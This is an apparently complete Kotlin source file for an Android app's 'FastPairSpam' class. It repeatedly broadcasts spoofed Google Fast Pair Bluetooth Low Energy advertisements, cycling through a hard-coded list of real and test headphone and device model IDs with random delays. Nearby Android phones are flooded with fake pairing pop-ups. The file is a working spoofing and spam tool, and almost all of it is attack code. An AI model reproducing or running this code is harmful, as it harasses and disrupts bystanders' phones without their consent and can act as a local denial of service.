package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import android.os.ParcelUuid
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class FastPairSpam : Spammer {

    private var _isSpamming = false
    private var blinkRunnable: Runnable? = null

    val devices = arrayOf(
        FastPairDevice("0x72EF8D", "Razer Hammerhead TWS X"),
        FastPairDevice("0x0E30C3", "Razer Hammerhead TWS"),
        FastPairDevice("0x00000D", "Test 00000D"),
        FastPairDevice("0x000007", "Android Auto"),
        FastPairDevice("0x070000", "Android Auto 2"),
        FastPairDevice("0x000008", "Foocorp Foophones"),
        FastPairDevice("0x080000", "Foocorp Foophones 2"),
        FastPairDevice("0x000009", "Test Android TV"),
        FastPairDevice("0x090000", "Test Android TV 2"),
        FastPairDevice("0x00000B", "Google Gphones"),
        FastPairDevice("0x0A0000", "Test 00000A - Anti-Spoofing"),
        FastPairDevice("0x0B0000", "Google Gphones 2"),
        FastPairDevice("0x0C0000", "Google Gphones 3"),
        FastPairDevice("0x060000", "Google Pixel Buds 2"),
        FastPairDevice("0x000048", "Fast Pair Headphones"),
        FastPairDevice("0x000049", "Fast Pair Headphones 2"),
        FastPairDevice("0x480000", "Fast Pair Headphones 3"),
        FastPairDevice("0x490000", "Fast Pair Headphones 4"),
        FastPairDevice("0x000035", "Test 000035"),
        FastPairDevice("0x350000", "Test 000035 2"),
        FastPairDevice("0x001000", "LG HBS1110"),
        FastPairDevice("0x002000", "AIAIAI TMA-2 (H60)"),
        FastPairDevice("0x003000", "Libratone Q Adapt On-Ear"),
        FastPairDevice("0x003001", "Libratone Q Adapt On-Ear 2"),
        FastPairDevice("0x470000", "Arduino 101 2"),
        FastPairDevice("0xF00000", "Bose QuietComfort 35 II"),
        FastPairDevice("0xF00400", "T10"),
        FastPairDevice("0x003B41", "M&D MW65"),
        FastPairDevice("0x003D8A", "Cleer FLOW II"),
        FastPairDevice("0x005BC3", "Panasonic RP-HD610N"),
        FastPairDevice("0x008F7D", "soundcore Glow Mini"),
        FastPairDevice("0x00A168", "boAt Airdopes 621"),
        FastPairDevice("0x00AA48", "Jabra Elite 2"),
        FastPairDevice("0x00AA91", "Beoplay E8 2.0"),
        FastPairDevice("0x00B727", "Smart Controller 1"),
        FastPairDevice("0x00C95C", "Sony WF-1000X"),
        FastPairDevice("0x00FA72", "Pioneer SE-MS9BN"),
        FastPairDevice("0x0100F0", "Bose QuietComfort 35 II"),
        FastPairDevice("0x011242", "Nirvana Ion"),
        FastPairDevice("0x013D8A", "Cleer EDGE Voice"),
        FastPairDevice("0x01AA91", "Beoplay H9 3rd Generation"),
        FastPairDevice("0x01C95C", "Sony WF-1000X"),
        FastPairDevice("0x01E5CE", "BLE-Phone"),
        FastPairDevice("0x01EEB4", "WH-1000XM4"),
        FastPairDevice("0x0200F0", "Goodyear"),
        FastPairDevice("0x02AA91", "B&O Earset"),
        FastPairDevice("0x02C95C", "Sony WH-1000XM2")

    )

    lateinit var devicesAdvertiseData: Array<AdvertiseData>
    private var loop = 0
    private val executor = Executors.newSingleThreadExecutor()

    init {
        devicesAdvertiseData = devices.map { device ->
            val modelId = device.value.removePrefix("0x").toLong(16).toInt()
            val data = AdvertiseData.Builder()
                .addManufacturerData(0x00E0, Helper.convertHexToByteArray("0F${device.value}"))
                .addServiceData(ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), Helper.convertHexToByteArray("00${modelId.toString(16).padStart(6, '0').uppercase()}"))
                .build()
            data
        }.toTypedArray()
    }

    override fun start() {
        executor.execute @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) {
            _isSpamming = true
            var loop = 0
            while (loop <= Helper.MAX_LOOP && _isSpamming) {
                val deviceIndex = (0 until devices.size).random()
                val data = devicesAdvertiseData[deviceIndex]
                val scanResponse = AdvertiseData.Builder()
                    .addManufacturerData(0x00E0, Helper.convertHexToByteArray("0F${devices[deviceIndex].value}"))
                    .build()
                BluetoothAdvertiser().advertise(data, scanResponse)
                blinkRunnable?.run()
                Thread.sleep(Helper.getRandomDelay())
                loop++
            }
            _isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun stop() {
        _isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? {
        return blinkRunnable
    }
}
